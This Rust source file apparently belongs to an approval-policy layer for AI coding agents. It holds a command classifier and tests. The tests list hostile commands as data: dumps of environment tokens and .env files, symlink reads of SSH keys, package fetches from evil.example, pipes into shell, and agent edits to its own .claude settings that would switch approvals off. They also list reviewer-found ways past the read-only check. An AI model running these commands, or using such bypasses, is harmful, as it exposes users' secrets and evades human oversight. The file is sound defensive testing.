        // A plain `program args…`: a bare name (`./cat` or `bin/tool` could be anything), no
        // `VAR=x` prefix (GIT_EXTERNAL_DIFF, PAGER, LD_PRELOAD…), no wrapper, no `$` expansion.
        let prog = first.text.as_str();
        if first.var
            || first.glob
            || prog.is_empty()
            || prog.contains('/')
            || classify::is_assignment(prog)
            || classify::is_wrapper(prog)
            || rest.iter().any(|w| w.var)
            || (rest.iter().any(|w| w.glob) && !GLOB_SAFE.contains(&prog))
        {
            return None;
        }
        let args: Vec<String> = rest.iter().map(|w| w.text.clone()).collect();
        if read_only(prog, &args) {
            continue;
        }
        if test_runner(prog, &args) {
            kind = "test runner";
            continue;
        }
        return None;
    }
    Some(kind)
}

fn test_runner(prog: &str, args: &[String]) -> bool {
    // Not the options, and not the env file a program is told to load (`uv run --env-file .env pytest`).
    let words: Vec<&str> = args
        .iter()
        .enumerate()
        .filter(|(i, a)| !a.starts_with('-') && !(*i > 0 && args[i - 1] == "--env-file"))
        .map(|(_, a)| a.as_str())
        .collect();
    let writes = has(args, &["--fix", "--write", "-w", "--watch", "--update-snapshots", "-u"]);
    if writes {
        return false;
    }
    match prog {
        "npm" | "pnpm" | "yarn" | "bun" => {
            // `dlx` / `x` always fetch the package: never a plain test run
            if words.contains(&"dlx") || words.first() == Some(&"x") {
                return false;
            }
            // The first of `run <script>` and `exec <tool>` is the subcommand (`pnpm exec vitest run`).
            match words.iter().position(|w| ["run", "run-script", "exec"].contains(w)) {
                Some(i) if words[i] == "exec" => !package_flag(args) && !call_flag(args) && words.get(i + 1).is_some_and(|r| is_runner(r)),
                Some(i) => words.get(i + 1).is_some_and(|s| check_script(s)),
                None => words.iter().any(|w| ["test", "t", "lint", "typecheck", "check"].contains(w) || is_runner(w)),
            }
        }
        // Whether the project has the runner installed is a risk check (`command_risks`).
        "npx" | "bunx" => classify::npx_runner(args).is_some(),
        // `node --test [files]`: Node's built-in runner (seen live from Claude workers).
        "node" => has(args, &["--test"]) && !has(args, &["--eval", "-e", "--print", "-p"]),
        "black" | "isort" | "prettier" => has(args, &["--check", "--diff", "-c"]),
        "ruff" => words.first().is_some_and(|w| *w == "check") || has(args, &["--check"]),
        p if is_runner(p) => true,
        "python" | "python3" | "uv" | "poetry" => {
            let w: Vec<&str> = if prog == "uv" || prog == "poetry" { words.iter().skip(1).copied().collect() } else { words.clone() };
            !classify::uv_run_fetches(args)
                && (w.first().is_some_and(|x| is_runner(x))
                    || has(args, &["-m"]) && w.first().is_some_and(|m| ["pytest", "unittest", "mypy", "pyright", "ruff"].contains(m)))
        }
        "go" => words.first().is_some_and(|w| ["test", "vet", "build"].contains(w)),
        "cargo" => match words.first().copied() {
            Some("test" | "check" | "clippy" | "build" | "nextest" | "bench" | "doc" | "metadata" | "tree") => true,
            Some("fmt") => has(args, &["--check"]),
            _ => false,
        },
        "make" | "just" | "task" | "ninja" => words.iter().any(|w| ["test", "tests", "check", "lint", "typecheck", "build"].contains(w)),
        "gradle" | "gradlew" | "mvn" | "mvnw" => words.iter().any(|w| ["test", "check", "build", "verify", "compile"].contains(w)),
        "dotnet" | "swift" | "deno" | "mix" | "zig" | "bazel" | "bazelisk" | "xcodebuild" => {
            words.iter().any(|w| ["test", "build", "check", "lint", "vet"].contains(w))
        }
        _ => false,
    }
}

#[cfg(test)]
mod node_test_runner {
    use super::*;

    #[test]
    fn node_test_pipelines_are_test_runs() {
        assert_eq!(classify_command("node --test test/strings.test.js 2>&1 | tail -8", &[]), Some("test runner"));
        assert_eq!(classify_command("node --test", &[]), Some("test runner"));
        assert_eq!(classify_command("node script.js", &[]), None);
        assert_eq!(classify_command("node --test -e 'require(\"fs\").rmSync(\"x\")'", &[]), None);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn texts(segs: &[Vec<Word>]) -> Vec<Vec<&str>> {
        segs.iter().map(|s| s.iter().map(|w| w.text.as_str()).collect()).collect()
    }

    #[test]
    fn tokenizer_finds_segments_and_writes() {
        let p = parse("cd src && grep -rn 'a b' . | head -5 > out.txt 2>&1");
        assert_eq!(texts(&p.segments), vec![vec!["cd", "src"], vec!["grep", "-rn", "a b", "."], vec!["head", "-5"]]);
        assert_eq!(p.writes.iter().map(|w| w.text.as_str()).collect::<Vec<_>>(), vec!["out.txt"]);
        assert!(!p.complex);
        assert!(parse("echo $(whoami)").complex);
        assert!(parse("cat <<EOF\nx\nEOF").complex);
        assert_eq!(parse("ls 2>/dev/null").writes[0].text, "/dev/null");
        // what the shell expands is marked; quoted text is not
        let p = parse("cat $HOME/x \"${A}\" $'b' '$c' \\$d 'x$' * a* ''{-o,f} {} \"$?\"");
        let flags: Vec<(bool, bool)> = p.segments[0].iter().map(|w| (w.var, w.glob)).collect();
        let (v, g, none) = ((true, false), (false, true), (false, false));
        assert_eq!(flags, vec![none, v, v, v, none, none, none, g, none, g, none, none]);
        assert_eq!(texts(&parse("(git push) && { ls; }").segments), vec![vec!["git", "push"], vec!["ls"]]);
    }

    /// Reviewer-verified bypasses: each of these was auto-allowed as a read.
    #[test]
    fn writes_and_execs_are_not_read_only() {
        for c in [
            "sort -o out.txt in.txt",
            "sort -ro out.txt in.txt",
            "sort --output=out.txt in.txt",
            "sort --out=out.txt in.txt",
            "sort --compress-program=sh in.txt",
            "uniq a b",
            "xxd a b",
            "tree -o f",
            "tree -R -H . src",
            "sed -n 'w out.txt' in",
            "sed -n '1,5w out.txt' in",
            "sed 's/a/b/w out.txt' in",
            "sed 's/a/b/e' in",
            "sed -n '/x/{p;r /etc/hosts\n}' in",
            "sed '1e touch x' in",
            "sed -ni p in",
            "sed -i.bak s/a/b/ in",
            "sed --in-place s/a/b/ in",
            "sed -f script.sed in",
            "git diff --output=f",
            "git log -p --output f",
            "git grep -O foo",
            "git grep --open-files-in-pager=vim foo",
            "git reflog expire --all",
            "git help -w log",
            "fd . -x true",
            "fd -HX rm",
            "fd . --exec true",
            "rg --pre ./x.sh foo",
            "rg --pre=./x.sh foo",
            "rg --pre-glob '*.pdf' --pre x foo",
            "rg --hostname-bin ./x.sh foo",
            "ag --pager=./x.sh foo",
            "ack foo",
            "file -C -m magic",
            "date -s 12:00",
            "date 0101000026",
            "hostname evil",
            "git -c diff.external=true diff",
            "git -c core.pager=./x.sh log",
            "git --config-env=core.pager=X log",
            "git --exec-path=. status",
            "GIT_EXTERNAL_DIFF=true git diff",
            "PAGER=./x.sh git log",
            "env git diff",
            "nice cat x",
            "./cat x",
            "./tool.sh --help",
            "bin/tool --version",
            "/tmp/x/ls",
            "cargo --version",
            "cat $HOME/.profile",
            "sort $X",
            "$CMD foo",
            "rg foo *",
            "sort ''{-o,out} in",
            "ls *(e:true:)",
        ] {
            assert_eq!(classify_command(c, &[]), None, "{c}");
        }
        for c in [
            "sort in.txt",
            "sort -rn -k2 in.txt",
            "uniq -c in.txt",
            "xxd -l 64 in.bin",
            "tree -L 2 src",
            "sed -n '1,40p' src/lib.rs",
            "sed -n '/start/,/end/p;$p' x",
            "sed -E 's/(a|b)/x/g' x",
            "sed -n -e 's/x/y/p' -e '2{p;q}' x",
            "sed '1a hello; w out' x",
            "git diff --stat HEAD~1",
            "git log --oneline -5",
            "git grep -n foo",
            "git reflog -5",
            "fd -e rs src",
            "rg -n --pretty 'fn main$' src",
            "date +%s",
            "ls *.ts",
            "wc -l src/*.rs",
            "grep -n foo *",
            "[ -f x ]",
            "echo \"exit $?\"",
        ] {
            assert_eq!(classify_command(c, &[]), Some("read-only command"), "{c}");
        }
    }

    fn risks(c: &str) -> Vec<String> {
        command_risks(c, Some(Path::new("/w/t1")), Some(Path::new("/w/t1")), 0)
    }

    #[test]
    fn hidden_paths_are_outside_the_worktree() {
        for c in [
            "cat $HOME/.profile",
            "cat \"${HOME}/.profile\"",
            "cat $'\\x2fetc/hosts'",
            "grep -f/etc/hosts x",
            "grep --file=/etc/hosts x",
            "tar -xzf~/a.tgz",
            "cat ~root/.profile",
            "PATH=bin:~/bin make",
            "cat {a,/etc/hosts}",
            "cat src/{a,../../x}/y",
            "cat {,/}etc/hosts",
            "cat =ls",
            "cd && cat .profile",
            "cd - && ls",
            "~/bin/tool",
            "../../run.sh",
            "echo x > $OUT",
        ] {
            assert!(risks(c).iter().any(|r| r == "outside worktree"), "{c}: {:?}", risks(c));
        }
        for c in [
            "cat src/a.rs",
            "rg 'x$' src",
            "git diff HEAD~1..HEAD",
            "echo \"$?\"",
            "/usr/bin/git status",
            "find . -exec grep -l x {} +",
            "mkdir -p src/{a,b}/c",
            "touch src/{a,b}/{x,y}.rs",
        ] {
            assert!(!risks(c).iter().any(|r| r == "outside worktree"), "{c}: {:?}", risks(c));
        }
    }

    #[test]
    fn codly_data_dir_is_outside_even_inside_the_root() {
        protect_dir(Path::new("/home/me/Library/Codly"));
        let r = |c: &str| command_risks(c, Some(Path::new("/home/me")), Some(Path::new("/home/me")), 0);
        assert!(r("cat /home/me/Library/Codly/runs/r1/claude-mcp.json").iter().any(|x| x == "outside worktree"));
        assert!(r("cat Library/Codly/runs/r1/claude-mcp.json").iter().any(|x| x == "outside worktree"));
        assert!(r("cat notes.txt").is_empty());
        let wt = Path::new("/home/me/Library/Codly/worktrees/repo/p/t1");
        assert!(command_risks("cat src/a.rs", Some(wt), Some(wt), 0).is_empty(), "a worktree inside the data dir is the agent's");
        assert!(command_risks("cat ../../../../runs/r1/claude-mcp.json", Some(wt), Some(wt), 0).iter().any(|x| x == "outside worktree"));
    }

    #[test]
    fn wrappers_and_nested_shells_do_not_hide_risks() {
        for c in [
            "timeout 5 git push",
            "gtimeout -k 1 5 git push",
            "nice -n 5 git push",
            "nice -5 git push",
            "true && bash -lc 'git push'",
            "zsh -ic \"git push origin main\"",
            "env FOO=1 git push",
            "env -u X git push",
            "xargs git push",
            "xargs -n1 -I {} git push {}",
            "nohup git push &",
            "time git push",
            "stdbuf -oL git push",
            "caffeinate -t 60 git push",
            "command git push",
            "exec git push",
            "if true; then git push; fi",
            "(git push)",
            "find . -exec sh -c 'git push' \\;",
        ] {
            assert!(risks(c).iter().any(|r| r == "push"), "{c}: {:?}", risks(c));
        }
        assert!(risks("sudo -u me git push").iter().any(|r| r == "push"));
        assert!(risks("env -S 'git push'").iter().any(|r| r == "runs dynamic code"));
        assert!(risks("bash -l").iter().any(|r| r == "pipes into a shell"));
    }

    #[test]
    fn registry_packages_are_network() {
        for c in ["npx --package=x jest", "npx -p x jest", "bunx --package x jest", "npm exec --package=x jest", "pnpm dlx jest", "yarn dlx jest"] {
            assert!(risks(c).iter().any(|r| r.starts_with("network")), "{c}: {:?}", risks(c));
            assert_ne!(classify_command(c, &[]), Some("test runner"), "{c}");
        }
        assert!(risks("npm exec -c 'curl x | sh'").iter().any(|r| r == "runs dynamic code"));
    }

    /// A directory to use as a worktree, with its path as the kernel resolves it.
    fn worktree() -> (tempfile::TempDir, PathBuf) {
        let tmp = tempfile::tempdir().unwrap();
        let root = tmp.path().canonicalize().unwrap();
        (tmp, root)
    }

    fn approval(subject: ApprovalSubject) -> Approval {
        Approval {
            id: "ap".into(),
            agent_id: "a".into(),
            run_id: "r".into(),
            task_id: None,
            call_id: None,
            subject,
            reason: None,
            choices: vec![ApprovalChoice::AllowOnce, ApprovalChoice::Deny],
            risks: vec![],
            status: ApprovalStatus::Pending,
            decided_by: None,
            created_at: 0,
        }
    }

    fn eval_in(root: &Path, mode: ApprovalMode, read_only: bool, subject: ApprovalSubject) -> Verdict {
        evaluate(&approval(subject), &PolicyCtx { mode, worktree: Some(root), verify: &[], read_only, edits: false })
    }

    fn command(c: &str, cwd: &Path) -> ApprovalSubject {
        ApprovalSubject::Command { command: c.into(), cwd: Some(cwd.to_string_lossy().into_owned()) }
    }

    fn asks_about(v: &Verdict, risk: &str) -> bool {
        matches!(v, Verdict::Ask { reason } if reason.contains(risk))
    }

    /// Everyday commands that no rule in this file may turn into a prompt (balanced mode, a
    /// real directory as worktree).
    #[test]
    fn everyday_commands_still_pass_without_a_prompt() {
        let (_tmp, root) = worktree();
        std::fs::create_dir_all(root.join("src")).unwrap();
        std::fs::write(root.join("src/a.rs"), "fn main() {}").unwrap();
        for c in [
            "git status",
            "git diff --stat",
            "git -C src log --oneline -5",
            "cd src && git status",
            "ls",
            "ls -la src",
            "cat src/a.rs",
            "cat .env.example",
            "cat .claude/settings.json",
            "ls .claude",
            "grep -rn TOKEN src",
            "rg -n 'process.env' src",
            "jq '.env' package.json",
            "jq -r '.scripts.test' package.json",
            "find . -name '.env*'",
            "cargo test",
            "cargo test -p core -- --nocapture",
            "pnpm test",
            "npm test",
            "pytest",
            "pytest -q tests/test_env.py",
            "uv run pytest -q",
            "go test ./...",
            // reads and tests that only name an agent's settings, `.git` or an env file
            "[[ -d .git ]] && git status",
            "tree -a -I .git",
            "fd -H -E .git foo",
            "git diff -- .claude/skills/x.md",
            "git log --oneline -- .cursor/rules",
            "sed -n 1,20p .claude/settings.json",
            "node --env-file=.env.test --test",
            "uv run --env-file .env pytest",
            // patterns that name every file, or none of the guarded ones
            "cat *",
            "grep -n foo *",
            "wc -l src/*.rs",
            "ls src/{a,b}.rs",
            "grep -e '.e*' src/a.rs",
        ] {
            let v = eval_in(&root, ApprovalMode::Balanced, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
        // A worker allowed to work alone also sets a project up without a prompt.
        for c in [
            "cp .env.example .env",
            "echo .env >> .gitignore",
            "tar --exclude=.claude -czf out.tgz src",
            "node scripts/gen.js",
            "[[ -f .env ]] || cp .env.example .env",
            "bash -c 'cp .env.example ./.env'",
            "mkdir -p src/{a,b}/{x,y}",
            "chmod 644 *.json",
            "sed -i -e 's/.*/x/' notes.txt",
        ] {
            let v = eval_in(&root, ApprovalMode::Autonomous, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
        // Reading an agent's settings is no reason to stop a worker with full access.
        for c in ["git diff -- .claude/skills/x.md", "sed -n 1,20p .claude/settings.json", "tree -a -I .git"] {
            let v = eval_in(&root, ApprovalMode::Full, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
    }

    /// security#5: an agent that rewrites its own CLI settings could switch approvals off.
    #[test]
    fn agent_settings_changes_ask_in_every_mode() {
        let wt = Path::new("/w/t1");
        for c in [
            "mkdir -p .claude && printf '{\"permissions\":{\"allow\":[\"Bash\"]}}' > .claude/settings.local.json",
            "echo '{}' > .mcp.json",
            "echo '{}' >> opencode.json",
            "tee .claude/settings.local.json",
            "cp /w/t1/x.json .codex/config.toml",
            "mv x.json .gemini/settings.json",
            "sed -i '' s/ask/allow/ .opencode/config.json",
            "cd .claude && ls",
            "python3 gen.py --out=.cursor/cli.json",
            "touch .Claude/settings.local.json",
            "bash -c 'echo x > .claude/settings.json'",
            "rm .mcp.json",
            // The name behind a pattern, a brace list or an option it is glued to.
            "cd .cl* && echo '{\"permissions\":{\"allow\":[\"Bash\"]}}' > settings.local.json",
            "mkdir -p .{claude,x}",
            "sort -o.claude/settings.local.json x",
            "sort ''{-o,.claude/settings.local.json} x",
            "echo x > .cl*/settings.local.json",
            "cp x.json .c[l]aude/settings.json",
            "tee .{mcp,x}.json",
            "sed -i s/ask/allow/ o*.json",
        ] {
            for mode in [ApprovalMode::Balanced, ApprovalMode::Autonomous, ApprovalMode::Full] {
                let v = eval_in(wt, mode, false, command(c, wt));
                assert!(asks_about(&v, classify::AGENT_SETTINGS), "{c} in {mode:?}: {v:?}");
            }
        }
        for p in [".claude/settings.local.json", "/w/t1/.mcp.json", "sub/.codex/config.toml", "/home/me/.claude/settings.json"] {
            let edit = ApprovalSubject::FileChange { paths: vec![p.into()], diff: None };
            assert!(asks_about(&eval_in(wt, ApprovalMode::Full, false, edit), classify::AGENT_SETTINGS), "{p}");
        }
        let write = ApprovalSubject::Tool { name: "write_file".into(), input: serde_json::json!({ "file_path": ".gemini/settings.json" }) };
        assert!(asks_about(&eval_in(wt, ApprovalMode::Autonomous, false, write), classify::AGENT_SETTINGS));
        let read = ApprovalSubject::Tool { name: "Read".into(), input: serde_json::json!({ "file_path": ".claude/settings.json" }) };
        assert!(matches!(eval_in(wt, ApprovalMode::Balanced, false, read), Verdict::Allow { .. }), "reading them is fine");
        // git's own files are guarded too (hooks and config name programs git runs), below full mode.
        for c in ["cp hook.sh .git/hooks/pre-commit", "echo x >> .git/config", "chmod +x .git/hooks/post-merge"] {
            let v = eval_in(wt, ApprovalMode::Autonomous, false, command(c, wt));
            assert!(asks_about(&v, classify::GIT_INTERNALS), "{c}: {v:?}");
        }
        assert!(matches!(eval_in(wt, ApprovalMode::Balanced, false, command("cat .git/HEAD", wt)), Verdict::Allow { .. }));
        // A worktree that itself lives under `.claude/` is not its own settings.
        let nested = Path::new("/repo/.claude/worktrees/t1");
        let edit = ApprovalSubject::FileChange { paths: vec!["/repo/.claude/worktrees/t1/src/a.rs".into()], diff: None };
        assert!(matches!(eval_in(nested, ApprovalMode::Autonomous, false, edit), Verdict::Allow { .. }));
        let v = eval_in(nested, ApprovalMode::Autonomous, false, command("cargo test --manifest-path /repo/.claude/worktrees/t1/Cargo.toml", nested));
        assert!(matches!(v, Verdict::Allow { .. }), "{v:?}");
    }

    /// security#6: one auto-approved command must not put the user's tokens in the transcript.
    #[test]
    fn commands_that_show_secrets_ask() {
        let wt = Path::new("/w/t1");
        for c in [
            "printenv",
            "printenv GITHUB_TOKEN",
            "env",
            "env | grep -i token",
            "env -0",
            "set",
            "export -p",
            "export",
            "declare -x",
            "jq -n env",
            "jq -n '$ENV.GITHUB_TOKEN'",
            "jq -n 'env.HOME'",
            "cat .env",
            "cat .env.local",
            "head -5 config/.env.production",
            "grep KEY .env",
            "cat .env*",
            "base64 certs/server.key",
            "cat deploy/id_ed25519",
            "sort < .env",
            "bash -c 'cat .env'",
            // The shell turns these into `.env` or a private key.
            "cat .e*",
            "cat .e{nv,x}",
            "cat .[e]nv",
            "cat -- .en?",
            "head -3 id_*",
            "grep -f.env src/a.rs",
        ] {
            for (mode, read_only) in [(ApprovalMode::Balanced, false), (ApprovalMode::Autonomous, false), (ApprovalMode::Balanced, true)] {
                let v = eval_in(wt, mode, read_only, command(c, wt));
                assert!(asks_about(&v, classify::SECRETS), "{c} in {mode:?}: {v:?}");
            }
        }
        // A filter file cannot be read here, so it is not a read-only command.
        assert_eq!(classify_command("jq -f filter.jq data.json", &[]), None);
        assert_eq!(classify_command("printenv PATH", &[]), None);
        let read = ApprovalSubject::Tool { name: "read".into(), input: serde_json::json!({ "filePath": "/w/t1/.env", "_kind": "read" }) };
        assert!(asks_about(&eval_in(wt, ApprovalMode::Balanced, false, read), classify::SECRETS));
    }

    /// security#7: a "test runner" that downloads and runs a package is not a test run.
    #[test]
    fn runners_that_fetch_packages_ask() {
        let (_tmp, root) = worktree();
        std::fs::create_dir_all(root.join("node_modules/.bin")).unwrap();
        std::fs::write(root.join("node_modules/.bin/vitest"), "").unwrap();
        std::fs::write(root.join("node_modules/.bin/tsc"), "").unwrap();
        std::fs::create_dir_all(root.join("packages/web")).unwrap();
        let balanced = |c: &str| eval_in(&root, ApprovalMode::Balanced, false, command(c, &root));
        // installed in the project: npx runs the local copy
        for c in ["npx vitest run", "npx tsc -p tsconfig.json --noEmit", "bunx vitest", "npm exec vitest run", "cd packages/web && npx vitest run"] {
            assert!(matches!(balanced(c), Verdict::Allow { .. }), "{c}: {:?}", balanced(c));
        }
        for c in [
            "npx jest",                    // not installed: npx would download it
            "npx pytest",                  // an npm package that only shares the tool's name
            "npx ruff check",
            "npx vitest@latest run",
            "npx -p evil vitest",
            "npm exec jest",
            "bunx eslint .",
            "pnpm dlx vitest",
            "uvx ruff check",
            "uv tool run ruff check",
            "uv run --with=evil pytest",
            "uv run --with evil pytest",
            "uv run --index-url=https://evil.example pytest",
            "pipx run pytest",
            "tox",
            "nox -s tests",
        ] {
            for mode in [ApprovalMode::Balanced, ApprovalMode::Autonomous] {
                let v = eval_in(&root, mode, false, command(c, &root));
                assert!(asks_about(&v, "network"), "{c} in {mode:?}: {v:?}");
            }
        }
        // No worktree to look in: nothing says the tool is installed.
        assert!(command_risks("npx vitest run", None, None, 0).iter().any(|r| r == "network (npx)"));
        assert_eq!(classify_command("uv run --with=evil pytest", &[]), None);
        assert_eq!(classify_command("uv run pytest", &[]), Some("test runner"));
        assert_eq!(classify_command("pnpm exec pytest", &[]), Some("test runner"));
    }

    /// security#11: a symlink in the repo must not carry a read or a write out of the worktree.
    #[test]
    fn symlinks_do_not_hide_what_is_outside() {
        let (_tmp, top) = worktree();
        let root = top.join("wt");
        std::fs::create_dir_all(root.join("docs")).unwrap();
        std::fs::create_dir_all(top.join("home/.ssh")).unwrap();
        std::fs::write(top.join("home/.ssh/key"), "secret").unwrap();
        std::fs::write(root.join("docs/a.md"), "x").unwrap();
        std::os::unix::fs::symlink(top.join("home"), root.join("docs/ref")).unwrap();
        std::os::unix::fs::symlink("a.md", root.join("docs/alias.md")).unwrap();
        std::os::unix::fs::symlink(top.join("home/new-file"), root.join("dangling")).unwrap();
        for c in [
            "cat docs/ref/.ssh/key",
            "ls docs/ref",
            "cd docs/ref && ls",
            "cat docs/ref/../home/.ssh/key",
            "cat missing/../docs/ref/.ssh/key",
            "echo x > dangling",
            "echo x > docs/ref/new",
        ] {
            for (mode, read_only) in [(ApprovalMode::Balanced, false), (ApprovalMode::Autonomous, false), (ApprovalMode::Balanced, true)] {
                let v = eval_in(&root, mode, read_only, command(c, &root));
                assert!(asks_about(&v, "outside worktree"), "{c} in {mode:?}: {v:?}");
            }
        }
        for c in ["cat docs/alias.md", "cat docs/a.md", "ls docs", "cat docs/not-there.md"] {
            let v = eval_in(&root, ApprovalMode::Balanced, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "a link that stays inside is fine: {c}: {v:?}");
        }
        let read = |p: &str| ApprovalSubject::Tool { name: "Read".into(), input: serde_json::json!({ "file_path": p }) };
        assert!(asks_about(&eval_in(&root, ApprovalMode::Balanced, true, read("docs/ref/.ssh/key")), "outside worktree"));
        assert!(matches!(eval_in(&root, ApprovalMode::Balanced, true, read("docs/alias.md")), Verdict::Allow { .. }));
        let edit = ApprovalSubject::FileChange { paths: vec![root.join("docs/ref/x").to_string_lossy().into_owned()], diff: None };
        assert!(asks_about(&eval_in(&root, ApprovalMode::Autonomous, false, edit), "outside worktree"));
        // The worktree itself may be reached through a link (macOS: /tmp -> /private/tmp).
        std::os::unix::fs::symlink(&root, top.join("wt-link")).unwrap();
        let via = top.join("wt-link");
        assert!(matches!(eval_in(&via, ApprovalMode::Balanced, false, command("cat docs/a.md", &via)), Verdict::Allow { .. }));
        assert!(asks_about(&eval_in(&via, ApprovalMode::Balanced, false, command("cat docs/ref/.ssh/key", &via)), "outside worktree"));
    }

    /// security#11: git run inside a repository that sits in the worktree reads that
    /// repository's config and runs the programs it names.
    #[test]
    fn git_in_a_nested_repository_asks() {
        let (_tmp, root) = worktree();
        for d in ["vendor/bare/objects", "vendor/bare/refs", "vendor/bare/deep", "sub/.git", "src/app"] {
            std::fs::create_dir_all(root.join(d)).unwrap();
        }
        std::fs::write(root.join("vendor/bare/HEAD"), "ref: refs/heads/main\n").unwrap();
        std::fs::write(root.join(".git"), "gitdir: /elsewhere\n").unwrap(); // the worktree's own
        for c in [
            "git -C vendor/bare status",
            "git -C vendor -C bare status",
            "cd vendor/bare && git status",
            "cd vendor/bare/deep && git log -1",
            "cd vendor/bare",
            "git --git-dir=vendor/bare status",
            "git --git-dir vendor/bare log",
            "GIT_DIR=vendor/bare git status",
            "git -C sub status",
            "cd sub && git diff",
        ] {
            for (mode, read_only) in [(ApprovalMode::Balanced, false), (ApprovalMode::Autonomous, false), (ApprovalMode::Balanced, true)] {
                let v = eval_in(&root, mode, read_only, command(c, &root));
                assert!(asks_about(&v, NESTED_REPO), "{c} in {mode:?}: {v:?}");
            }
        }
        let inside = command("git status", &root.join("vendor/bare"));
        assert!(asks_about(&eval_in(&root, ApprovalMode::Autonomous, false, inside), NESTED_REPO), "the command's own cwd counts");
        for c in ["git -C src/app status", "cd src/app && git diff --stat", "git status", "ls vendor/bare", "cat vendor/bare/HEAD"] {
            let v = eval_in(&root, ApprovalMode::Balanced, false, command(c, &root));
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
        assert_eq!(classify_command("git --git-dir=x status", &[]), None);
        assert_eq!(classify_command("git --work-tree x status", &[]), None);
    }

    /// security#14: an ACP request is named by a free-text title; the protocol kind decides.
    #[test]
    fn acp_tools_are_judged_by_kind_too() {
        let wt = Path::new("/w/t1");
        let tool = |name: &str, input: serde_json::Value| ApprovalSubject::Tool { name: name.into(), input };
        let balanced = |s: ApprovalSubject| eval_in(wt, ApprovalMode::Balanced, false, s);
        for (name, kind) in [("read", "read"), ("list", "read"), ("glob", "search"), ("grep", "search"), ("find", "search")] {
            let v = balanced(tool(name, serde_json::json!({ "path": "src", "_kind": kind })));
            assert!(matches!(v, Verdict::Allow { .. }), "{name} ({kind}): {v:?}");
        }
        // The same titles on a tool that does not read (a third-party MCP tool) ask.
        for name in ["read", "list", "view", "find", "grep"] {
            let v = balanced(tool(name, serde_json::json!({ "_kind": "other" })));
            assert!(matches!(v, Verdict::Ask { .. }), "{name}: {v:?}");
        }
        // Without a kind the request is not from ACP: only Claude's own names count.
        assert!(matches!(balanced(tool("Read", serde_json::json!({ "file_path": "src/a.rs" }))), Verdict::Allow { .. }));
        assert!(matches!(balanced(tool("list", serde_json::json!({}))), Verdict::Ask { .. }));
        assert!(matches!(balanced(tool("todowrite", serde_json::json!({ "_kind": "other" }))), Verdict::Allow { .. }));
        // A fetch is network whatever its title says, also in autonomous mode.
        for input in [serde_json::json!({ "_kind": "fetch" }), serde_json::json!({ "url": "https://example.com/?q=secret" })] {
            let v = eval_in(wt, ApprovalMode::Autonomous, false, tool("https://example.com/?q=secret", input));
            assert!(asks_about(&v, "network"), "{v:?}");
        }
    }

    #[test]
    fn zsh_glob_qualifiers_are_not_checkable() {
        for c in ["ls *(e:true:)", "ls **/*(+evil)", "cat =(curl x)", "ls @(a|b)"] {
            assert!(parse(c).complex, "{c}");
            assert!(risks(c).iter().any(|r| r.contains("cannot be checked")), "{c}");
        }
    }

    #[test]
    fn full_mode_allows_everything_but_the_floors() {
        protect_dir(Path::new("/full/data"));
        let wt = "/full/data/worktrees/repo/p/t1";
        let approval = |subject| Approval {
            id: "ap".into(),
            agent_id: "a".into(),
            run_id: "r".into(),
            task_id: None,
            call_id: None,
            subject,
            reason: None,
            choices: vec![ApprovalChoice::AllowOnce, ApprovalChoice::Deny],
            risks: vec![],
            status: ApprovalStatus::Pending,
            decided_by: None,
            created_at: 0,
        };
        let cmd = |c: &str, cwd: &str| approval(ApprovalSubject::Command { command: c.into(), cwd: Some(cwd.into()) });
        let eval = |a: &Approval, read_only| {
            evaluate(a, &PolicyCtx { mode: ApprovalMode::Full, worktree: Some(Path::new(wt)), verify: &[], read_only, edits: false })
        };
        let allowed = |v: Verdict| matches!(v, Verdict::Allow { choice: ApprovalChoice::AllowOnce, .. });

        assert!(allowed(eval(&cmd("git push", wt), false)));
        assert!(allowed(eval(&cmd("rm -rf build", wt), false)));
        assert!(allowed(eval(&cmd("ls", "/tmp/elsewhere"), false)), "a cwd outside the worktree");

        let q = approval(ApprovalSubject::Question { questions: serde_json::json!([{ "question": "Which DB?" }]) });
        assert!(!allowed(eval(&q, false)));
        let p = approval(ApprovalSubject::Permissions { detail: serde_json::json!({}) });
        assert!(!allowed(eval(&p, false)));
        assert!(!allowed(eval(&cmd("npm install", wt), true)), "read-only agents never get writes");
        assert!(!allowed(eval(&cmd("touch a", wt), true)));
        assert!(allowed(eval(&cmd("git log -5", wt), true)));
        let v = eval(&cmd("cat /full/data/runs/r1/claude-mcp.json", wt), false);
        assert!(matches!(&v, Verdict::Ask { reason } if reason.contains(CODLY_DATA)), "{v:?}");
        assert!(!allowed(eval(&cmd("cat ../../../../runs/r1/claude-mcp.json", wt), false)));
        assert!(!allowed(eval(&cmd("cat ../t2/.env", wt), false)), "another task's worktree is Codly data too");
        assert!(allowed(eval(&cmd("cat src/a.rs", wt), false)));
        assert!(!allowed(eval(&cmd("ls", "/full/data/runs"), false)));

        let mut a = cmd("git push", wt);
        a.choices = vec![ApprovalChoice::AllowAlways, ApprovalChoice::Deny];
        assert!(matches!(eval(&a, false), Verdict::Ask { .. }), "no allow_once offered");
    }

    #[test]
    fn only_qualified_codly_tool_names_count() {
        assert!(is_codly_tool("mcp__codly__codly_board"));
        assert!(is_codly_tool("codly_codly_submit_report"));
        assert!(is_codly_tool("codly__codly_post_note"));
        assert!(!is_codly_tool("codly_board"));
        assert!(!is_codly_tool("codly_submit_report"));
        assert!(!is_codly_tool("mcp__evil__codly_board"));
    }
}
